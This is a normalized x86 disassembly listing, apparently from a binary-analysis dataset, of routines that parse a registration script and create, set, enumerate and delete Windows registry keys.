mov eax [ esi ]
mov edx [ esi + 0x8 ]
add esp 0x4
xor ecx ecx
mov [ edx + eax * 2 ] cx
mov eax 0x1
pop ebx
pop ebp
retn 0x4
jb r-xdata
push eax
push edx
call [ CoTaskMemRealloc@IAT ]
test eax eax
je r-xdata
cmp eax 0xffffffff
ja r-xdata
mov [ esi + 0x8 ] eax
sub_410050
push ebp
mov ebp esp
push 0xffffffff
push sub_4489a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov esi edx
mov ebx ecx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] edi
test esi esi
je r-xdata
mov eax 0x80004003
test edi edi
je r-xdata
push esi
mov [ edi ] 0x0
call [ lstrlenW@IAT ]
add eax eax
cmp eax 0x64
jge r-xdata
xor ecx ecx
shld ecx eax 0x1
xor edx edx
mov [ ebp - 0x6c ] eax
add eax eax
mov [ ebp - 0x70 ] edx
cmp ecx edx
ja r-xdata
mov eax 0x3e8
xor eax eax
jmp r-xdata
cmp eax 0xffffffff
jbe r-xdata
mov [ ebp - 0x68 ] eax
cmp eax edx
je r-xdata
push eax
call [ CoTaskMemAlloc@IAT ]
xor edx edx
mov [ ebp - 0x4 ] edx
cmp eax edx
jne r-xdata
xor ecx ecx
mov [ eax ] cx
mov al [ rw-data ]
mov [ ebx ] esi
mov [ ebp - 0x59 ] al
mov [ ebp - 0x58 ] edx
mov [ ebp - 0x60 ] edx
mov [ ebp - 0x52 ] 0x0
mov [ ebp - 0x51 ] 0x0
cmp [ esi ] dx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push edx
call [ CoTaskMemFree@IAT ]
mov eax 0x8007000e
jmp r-xdata
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x68 ] edx
mov [ ebp - 0x70 ] edx
mov [ ebp - 0x6c ] edx
mov [ edi ] eax
cmp [ ebp - 0x59 ] 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov esi [ CharNextW@IAT ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
mov edi 0x1
lea esi [ ebp - 0x70 ]
call sub_40ffa0
test eax eax
je r-xdata
call esi
mov [ ebx ] eax
cmp [ eax ] 0x25
jne r-xdata
mov esi [ CharNextW@IAT ]
mov eax [ ebx ]
push r--data
push eax
call [ wcsstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x58 ] 0x8007000e
jmp r-xdata
mov ecx [ ebx ]
push ecx
call [ CharNextW@IAT ]
xor edx edx
mov [ ebx ] eax
cmp [ eax ] dx
jne r-xdata
mov ebx 0x25
call sub_410340
mov esi eax
test esi esi
je r-xdata
push eax
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
mov ecx [ ebx ]
cmp eax ecx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x68 ]
push eax
call [ CoTaskMemFree@IAT ]
mov eax [ ebp - 0x58 ]
jmp r-xdata
mov edi [ ebp - 0x74 ]
mov [ ebp - 0x58 ] 0x80020009
jmp r-xdata
mov ebx [ ebp - 0x64 ]
mov ecx [ ebx ]
sub eax ecx
sar eax 0x1
cmp eax 0x1f
jg r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x25
push eax
jne r-xdata
mov edx [ ebx ]
movzx eax [ edx ]
cmp eax 0x7b
jne r-xdata
mov eax ebx
call sub_411000
test eax eax
je r-xdata
mov [ ebp - 0x51 ] 0x1
jmp r-xdata
mov esi [ CharNextW@IAT ]
push ecx
call esi
push eax
mov [ ebx ] eax
call esi
push eax
mov [ ebx ] eax
call esi
push eax
mov [ ebx ] eax
call esi
lea ecx [ ebp - 0x70 ]
push ecx
mov ecx r--data
mov [ ebx ] eax
call sub_40fef0
test eax eax
je r-xdata
mov [ ebp - 0x58 ] 0x80004005
jmp r-xdata
lea edx [ ebp - 0x50 ]
push edx
mov edx 0x20
call sub_410aa0
mov edi [ ebx + 0x4 ]
add esp 0x4
lea ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x50 ]
push ecx
lea edi [ edi + 0x4 ]
mov [ ebp - 0x78 ] eax
call sub_40fe80
test eax eax
je r-xdata
cmp eax 0x7d
jne r-xdata
inc [ ebp - 0x60 ]
mov ecx [ ebx ]
push ecx
call esi
push eax
mov edi 0x1
lea esi [ ebp - 0x70 ]
mov [ ebx ] eax
call sub_40ffa0
test eax eax
je r-xdata
mov [ ebp - 0x51 ] 0x0
jmp r-xdata
mov [ ebp - 0x52 ] 0x1
jmp r-xdata
lea edx [ ebp - 0x70 ]
push edx
mov ecx eax
call sub_40fef0
test eax eax
je r-xdata
dec [ ebp - 0x60 ]
jne r-xdata
mov esi [ CharNextW@IAT ]
mov edx [ ebx ]
mov eax 0x27
cmp ax [ edx ]
jne r-xdata
cmp [ ebx ] esi
je r-xdata
cmp [ ebp - 0x52 ] 0x1
jne r-xdata
mov edi ebx
mov eax [ edi ]
push eax
call [ CharNextW@IAT ]
mov [ edi ] eax
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x70 ]
push eax
mov ecx r--data
call sub_40fef0
test eax eax
je r-xdata
jmp r-xdata
mov [ ebp - 0x52 ] 0x0
jmp r-xdata
sub_410340
push edi
xor edi edi
test eax eax
jne r-xdata
movzx ecx [ eax ]
test cx cx
je r-xdata
pop edi
retn
mov eax edi
pop edi
retn
push esi
mov esi [ CharNextW@IAT ]
mov edi eax
pop esi
push eax
call esi
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx bx
je r-xdata
pop esi
mov eax edi
pop edi
retn
sub_410380
push ebp
mov ebp esp
cmp [ esi ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push edi
push ebx
push 0x0
push 0x2001f
push 0x0
push 0x0
push 0x0
push edx
push eax
call [ RegCreateKeyExW@IAT ]
pop ebp
retn 0x8
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov edx [ ebp + 0xc ]
push 0x0
push ecx
mov ecx [ ebp + 0x8 ]
push edi
push ebx
push 0x0
push 0x2001f
push 0x0
push 0x0
push 0x0
push edx
push ecx
call eax
pop ebp
retn 0x8
sub_410400
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push 0x0
push 0x2001f
push 0x0
push 0x0
push 0x0
push eax
push ecx
call [ RegCreateKeyExW@IAT ]
push ebx
push eax
push ecx
lea edi [ ebp - 0x8 ]
lea ebx [ ebp - 0x4 ]
call sub_410380
mov edi [ ebp + 0x8 ]
pop ebx
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ edi ]
test ecx ecx
je r-xdata
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] 0x0
push ecx
call [ RegCloseKey@IAT ]
mov [ edi ] 0x0
sub_410480
push ebp
mov ebp esp
push 0xffffffff
push sub_444c2e
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
test [ rw-data ] 0x1
jne r-xdata
mov edi [ lstrcmpiW@IAT ]
lea esp [ esp ]
or [ rw-data ] 0x1
mov [ ebp - 0x4 ] esi
mov eax 0x8
mov [ rw-data ] ax
mov ecx 0x4008
mov edx 0x13
mov eax 0x11
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] cx
mov [ rw-data ] r--data
mov [ rw-data ] dx
mov [ rw-data ] r--data
mov [ rw-data ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov dx [ esi * 8 + rw-data ]
mov [ eax ] dx
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
inc esi
cmp esi 0x4
jb r-xdata
mov ecx [ esi * 8 + rw-data ]
push ecx
push ebx
call edi
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_410580
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push ebx
mov ebx [ lstrlenW@IAT ]
push edi
xor edi edi
lea ecx [ ecx ]
lea eax [ esi + 0xd ]
pop esi
pop ebp
retn 0xc
push esi
call ebx
inc eax
lea esi [ esi + eax * 2 ]
lea edi [ edi + eax * 2 ]
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push edi
push eax
mov eax [ edx ]
push 0x7
push 0x0
push ecx
push eax
call [ RegSetValueExW@IAT ]
pop edi
pop ebx
pop esi
pop ebp
retn 0xc
sub_4105e0
push ebp
mov ebp esp
push 0xffffffff
push sub_448971
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x2128
call sub_444aa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x212c ] esi
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2124 ] eax
mov [ ebp - 0x2120 ] ecx
mov [ ebp - 0x2138 ] edx
mov [ ebp - 0x211c ] 0x0
lea eax [ ebp - 0x2014 ]
mov edi esi
call sub_411030
test eax eax
js r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x211c ]
push eax
lea ebx [ ebp - 0x2014 ]
call sub_410480
add esp 0x4
test eax eax
jne r-xdata
call sub_411aa0
lea eax [ ebp - 0x2014 ]
mov edi esi
call sub_411030
xor esi esi
cmp eax esi
jl r-xdata
mov eax 0x80020009
jmp r-xdata
movzx eax [ ebp - 0x211c ]
cmp eax 0x13
jg r-xdata
cmp eax 0x4008
jne r-xdata
je r-xdata
mov eax [ ebp - 0x2138 ]
mov edi [ ebp - 0x212c ]
call sub_411030
xor edx edx
cmp eax esi
setge dl
dec edx
and eax edx
lea edx [ ebp - 0x2014 ]
push edx
call [ lstrlenW@IAT ]
add eax 0x2
mov [ ebp - 0x2118 ] esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
shld ecx eax 0x1
mov [ ebp - 0x2130 ] ecx
add eax eax
mov [ ebp - 0x2134 ] eax
cmp ecx esi
ja r-xdata
mov [ ebp - 0x2130 ] esi
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x2128 ]
push ecx
push esi
push esi
lea edx [ ebp - 0x2014 ]
push edx
call [ VarUI4FromStr@IAT ]
mov eax [ ebp - 0x2128 ]
mov [ ebp - 0x211c ] eax
push 0x4
lea ecx [ ebp - 0x211c ]
push ecx
push 0x4
push esi
mov edx [ ebp - 0x2120 ]
push edx
mov eax [ ebp - 0x2124 ]
mov ecx [ eax ]
push ecx
call [ RegSetValueExW@IAT ]
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x2130 ]
call sub_409b30
jmp r-xdata
cmp eax 0x8
je r-xdata
push 0x80070216
call sub_402d00
cmp eax 0xffffffff
jbe r-xdata
xor esi esi
cmp ebx esi
je r-xdata
lea ecx [ ebp - 0x2014 ]
push ecx
call [ lstrlenW@IAT ]
lea edx [ eax + eax + 0x2 ]
push edx
lea eax [ ebp - 0x2014 ]
push eax
push 0x1
push esi
mov ecx [ ebp - 0x2120 ]
push ecx
mov edx [ ebp - 0x2124 ]
mov eax [ edx ]
push eax
call [ RegSetValueExW@IAT ]
mov ebx eax
jmp r-xdata
cmp eax 0x11
jne r-xdata
cmp eax 0x100
jbe r-xdata
mov eax ebx
call sub_410ff0
jmp r-xdata
lea ecx [ ebp - 0x2014 ]
push ecx
call [ lstrlenW@IAT ]
mov ebx eax
mov [ ebp - 0x2128 ] ebx
test bl 0x1
jne r-xdata
lea edx [ ebp - 0x2114 ]
mov [ ebp - 0x2118 ] edx
lea ecx [ ebp - 0x2118 ]
push ecx
call sub_40fe40
jmp r-xdata
mov eax 0x80004005
jmp r-xdata
cdq
sub eax edx
mov edi eax
sar edi 0x1
mov [ ebp - 0x211c ] edi
mov [ ebp - 0x2118 ] esi
mov esi 0x4
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] 0x5
mov eax edi
mov [ ebp - 0x2134 ] eax
xor ecx ecx
mov [ ebp - 0x2130 ] ecx
ja r-xdata
mov ebx 0xe
lea ebx [ ebp - 0x2014 ]
cmp [ ebp - 0x2014 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x2118 ]
test esi esi
je r-xdata
push 0x80070216
call sub_402d00
cmp eax 0xffffffff
jbe r-xdata
lea eax [ ebp - 0x2118 ]
call sub_410570
xor edx edx
mov [ esi ] edx
mov ecx [ ebp - 0x2118 ]
push ecx
mov edx [ ebp - 0x2120 ]
push edx
mov eax [ ebp - 0x2124 ]
push eax
call sub_410580
mov ebx eax
jmp r-xdata
mov edi [ CharNextW@IAT ]
lea esp [ esp ]
cmp eax 0x100
jbe r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2114 ]
cmp [ ebp - 0x2118 ] ecx
je r-xdata
mov [ esi ] cx
add esi 0x2
add ebx 0x2
cmp [ eax ] 0x30
jne r-xdata
lea eax [ ebp - 0x2114 ]
mov [ ebp - 0x2118 ] eax
mov [ ebp - 0x4 ] esi
jmp r-xdata
lea edx [ ebp - 0x2118 ]
push edx
call sub_40fe40
mov [ ebp - 0x4 ] esi
jmp r-xdata
push ebx
call edi
movzx ecx [ ebx ]
cmp ecx 0x5c
jne r-xdata
xor ecx ecx
mov [ esi ] cx
add esi 0x2
push eax
call edi
mov ebx eax
jmp r-xdata
mov eax [ ebp - 0x2118 ]
test eax eax
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
push edi
push 0x0
push eax
call memset
add esp 0xc
xor esi esi
test ebx ebx
jle r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2114 ]
cmp [ ebp - 0x2118 ] ecx
je r-xdata
mov edx [ ebp - 0x2124 ]
mov eax [ edx ]
push edi
mov ecx [ ebp - 0x2118 ]
push ecx
push 0x3
push 0x0
mov edx [ ebp - 0x2120 ]
push edx
push eax
call [ RegSetValueExW@IAT ]
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x2114 ]
cmp [ ebp - 0x2118 ] eax
je r-xdata
mov edx esi
shr edx 0x1
add edx [ ebp - 0x2118 ]
movzx eax [ ebp + esi * 2 - 0x2014 ]
lea ecx [ eax - 0x30 ]
cmp ecx 0x36
ja r-xdata
lea eax [ ebp - 0x2118 ]
call sub_410570
lea eax [ ebp - 0x2118 ]
call sub_410570
jmp r-xdata
xor al al
movzx ecx [ ecx + lookup_table_410a5c ]
jmp [ ecx * 4 + jump_table_410a4c ]
mov edi [ ebp - 0x211c ]
sub al 0x30
jmp r-xdata
sub al 0x37
jmp r-xdata
sub al 0x57
jmp r-xdata
mov ecx esi
and ecx 0x1
add ecx ecx
lea edi [ ecx + ecx ]
mov ecx 0x4
sub ecx edi
shl al cl
or [ edx ] al
inc esi
cmp esi ebx
jl r-xdata
sub_410a60
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add [ ecx ] eax
add [ ecx ] eax
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
add al [ edx ]
add al [ edx ]
add cl ah
int3
sub_410aa0
push ebp
mov ebp esp
push eax
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
call [ wcsncpy_s@IAT ]
add esp 0x10
cmp eax 0x50
ja r-xdata
push 0x80004005
call sub_402d00
movzx ecx [ eax + lookup_table_410af8 ]
jmp [ ecx * 4 + jump_table_410ae8 ]
push 0x8007000e
call sub_402d00
push 0x80070057
call sub_402d00
pop ebp
retn
sub_410afc
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ah cl
int3
sub_410b50
push ebp
mov ebp esp
mov eax 0x2004
call sub_444aa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebx ] 0x3d
push edi
mov edi ecx
jne r-xdata
xor eax eax
mov eax ebx
call sub_411030
test eax eax
js r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_443fba
mov esp ebp
pop ebp
retn
push esi
mov esi edi
call sub_411aa0
lea eax [ ebp - 0x2004 ]
call sub_411030
pop esi
test eax eax
js r-xdata
mov eax ebx
call sub_411030
test eax eax
js r-xdata
sub_410bb0
push esi
push edi
mov edi [ lstrcmpiW@IAT ]
mov esi r--data
lea ecx [ ecx ]
pop edi
xor eax eax
pop esi
retn
add esi 0x4
cmp esi r--data
jl r-xdata
mov eax [ esi ]
push eax
push ebx
call edi
test eax eax
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
sub_410bf0
push ebp
mov ebp esp
cmp [ esi ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push edi
push ebx
push 0x0
push edx
push eax
call [ RegOpenKeyExW@IAT ]
pop ebp
retn 0x8
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov edx [ ebp + 0xc ]
push 0x0
push ecx
mov ecx [ ebp + 0x8 ]
push edi
push ebx
push 0x0
push edx
push ecx
call eax
pop ebp
retn 0x8
sub_410c60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0x8 ]
mov ebx edx
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea edx [ ebp - 0x4 ]
push edx
push ebx
push 0x0
push eax
push ecx
call [ RegOpenKeyExW@IAT ]
push eax
push ecx
lea edi [ ebp - 0x4 ]
call sub_410bf0
mov edi [ ebp + 0x8 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ edi ]
test ecx ecx
je r-xdata
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
and ebx 0x300
mov [ edi ] ecx
mov [ edi + 0x4 ] ebx
push ecx
call [ RegCloseKey@IAT ]
mov [ edi ] 0x0
sub_410cd0
push ebp
mov ebp esp
push 0xffffffff
push sub_44629b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov ecx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x22c ] eax
mov [ ebp - 0x230 ] ecx
mov [ ebp - 0x220 ] edi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x218 ] edi
mov [ ebp - 0x4 ] edi
mov ebx [ eax + 0x4 ]
mov esi [ ebp - 0x218 ]
mov eax [ eax ]
or ebx 0x2001f
mov [ ebp - 0x228 ] edi
cmp esi edi
je r-xdata
lea edx [ ebp - 0x228 ]
push edx
push ebx
push edi
push ecx
push eax
call [ RegOpenKeyExW@IAT ]
push ecx
push eax
lea edi [ ebp - 0x228 ]
call sub_410bf0
xor edi edi
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x220 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x220 ]
xor eax eax
cmp ecx edi
je r-xdata
mov esi eax
cmp esi edi
jne r-xdata
mov eax esi
push eax
call [ RegCloseKey@IAT ]
mov [ ebp - 0x220 ] edi
mov ecx [ ebp - 0x228 ]
and ebx 0x300
mov [ ebp - 0x21c ] edi
mov esi eax
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x21c ] ebx
cmp eax edi
jne r-xdata
push ecx
call [ RegCloseKey@IAT ]
mov [ ebp - 0x220 ] edi
mov esi [ RegEnumKeyExW@IAT ]
lea eax [ ebp - 0x238 ]
push eax
push edi
push edi
push edi
lea edx [ ebp - 0x224 ]
push edx
lea eax [ ebp - 0x214 ]
push eax
push edi
push ecx
mov [ ebp - 0x224 ] 0x100
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x220 ]
cmp eax edi
je r-xdata
mov edi edi
mov ebx [ ebp - 0x230 ]
mov eax [ ebp - 0x22c ]
mov [ ebp - 0x21c ] edi
call sub_410f40
mov esi eax
push eax
call [ RegCloseKey@IAT ]
mov [ ebp - 0x220 ] edi
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x220 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x238 ]
push edx
mov edx [ ebp - 0x220 ]
push edi
push edi
push edi
lea eax [ ebp - 0x224 ]
push eax
lea ecx [ ebp - 0x214 ]
push ecx
push edi
push edx
mov [ ebp - 0x224 ] 0x100
call esi
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
push eax
call [ RegCloseKey@IAT ]
mov [ ebp - 0x220 ] edi
lea ecx [ ebp - 0x214 ]
push ecx
lea ecx [ ebp - 0x220 ]
call sub_410cd0
mov ebx eax
cmp ebx edi
jne r-xdata
mov [ ebp - 0x21c ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
sub_410ed0
push ebp
mov ebp esp
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x0
push 0x0
push ecx
mov [ ebp - 0x4 ] 0x0
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
xor edx edx
cmp edx [ ebp - 0x4 ]
sbb eax eax
neg eax
mov esp ebp
pop ebp
retn
xor eax eax
mov esp ebp
pop ebp
retn
sub_410f40
push esi
push edi
mov edi eax
mov esi [ edi + 0x8 ]
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ esi ] 0x0
mov edi [ edi ]
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
mov edx [ edi ]
push ebx
push edx
call [ RegDeleteKeyW@IAT ]
pop edi
pop esi
retn
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
push 0x0
push edx
push ebx
push ecx
call eax
pop edi
pop esi
retn
mov [ rw-data ] 0x1
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
pop edi
mov eax 0x1
pop esi
retn
push ebx
push edi
call [ RegDeleteKeyW@IAT ]
pop edi
pop esi
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov ecx [ esi ]
push 0x0
push ecx
push 0x0
push 0x0
push ebx
push edi
call eax
pop edi
pop esi
retn
sub_411000
mov eax [ eax ]
mov ecx 0x27
cmp cx [ eax ]
jne r-xdata
xor eax eax
retn
push eax
call [ CharNextW@IAT ]
mov edx 0x27
cmp dx [ eax ]
je r-xdata
mov eax 0x1
retn
sub_411030
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov ecx eax
movzx eax [ ecx ]
xor edx edx
cmp dx ax
jne r-xdata
movzx ecx [ ecx + lookup_table_4111a8 ]
jmp [ ecx * 4 + jump_table_4111a0 ]
mov edx 0x27
push ebx
mov [ ebp - 0x4 ] esi
cmp dx ax
jne r-xdata
mov eax 0x80020009
pop esi
mov esp ebp
pop ebp
retn
push eax
call [ CharNextW@IAT ]
mov [ edi ] eax
jmp r-xdata
mov ebx [ edi ]
movzx eax [ ebx ]
add eax 0xfffffff7
cmp eax 0x17
ja r-xdata
mov ebx [ CharNextW@IAT ]
push ecx
call ebx
xor ecx ecx
mov [ edi ] eax
cmp cx [ eax ]
mov eax [ edi ]
movzx ecx [ eax ]
add ecx 0xfffffff7
cmp ecx 0x17
ja r-xdata
push ebx
call [ CharNextW@IAT ]
mov edx [ ebp - 0x4 ]
mov [ edi ] eax
sub eax ebx
sar eax 0x1
lea ecx [ esi + eax * 2 + 0x2 ]
add edx 0x2000
cmp ecx edx
jae r-xdata
movzx edx [ eax + lookup_table_4111c8 ]
jmp [ edx * 4 + jump_table_4111c0 ]
mov ecx [ edi ]
xor edx edx
cmp dx [ ecx ]
je r-xdata
mov eax [ edi ]
mov edx 0x27
cmp dx [ eax ]
jne r-xdata
pop ebx
mov eax 0x80020009
pop esi
mov esp ebp
pop ebp
retn
test eax eax
jle r-xdata
xor ecx ecx
pop ebx
mov [ esi ] cx
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
mov [ esi ] ax
mov ecx [ edi ]
push ecx
call ebx
pop ebx
mov [ edi ] eax
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov edx 0x27
cmp dx [ eax ]
jne r-xdata
push eax
call ebx
mov ecx 0x27
cmp cx [ eax ]
jne r-xdata
mov edx [ edi ]
xor eax eax
cmp ax [ edx ]
jne r-xdata
sub ebx esi
nop
mov ebx [ edi ]
push ebx
call [ CharNextW@IAT ]
mov edx [ ebp - 0x4 ]
mov [ edi ] eax
sub eax ebx
sar eax 0x1
lea ecx [ esi + eax * 2 + 0x2 ]
add edx 0x2000
cmp ecx edx
jae r-xdata
push eax
call ebx
mov [ edi ] eax
mov cx [ ebx + esi ]
mov [ esi ] cx
add esi 0x2
dec eax
jne r-xdata
test eax eax
jle r-xdata
mov edx [ edi ]
mov ebx [ CharNextW@IAT ]
xor eax eax
cmp ax [ edx ]
jmp r-xdata
sub ebx esi
jmp r-xdata
je r-xdata
mov cx [ ebx + esi ]
mov [ esi ] cx
add esi 0x2
dec eax
jne r-xdata
sub_4111e0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4494c7
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x2264
call sub_444aa0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2260 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2278 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x38 ] esi
mov [ esp + 0x28 ] eax
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x2280 ] ebx
mov edx [ ebp + 0x14 ]
mov eax esi
mov edi ecx
mov [ esp + 0x54 ] edx
call sub_411030
mov edi eax
cmp edi ebx
jge r-xdata
cmp [ esi ] 0x7d
je r-xdata
mov [ esp + 0x2280 ] 0xffffffff
jmp r-xdata
mov [ esp + 0x2280 ] 0xffffffff
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
lea esp [ esp ]
mov [ esp + 0x18 ] ebx
mov eax edi
push eax
call [ RegCloseKey@IAT ]
mov [ esp + 0x14 ] ebx
mov edi [ esp + 0x10 ]
mov eax esi
call sub_411030
mov edi eax
cmp edi ebx
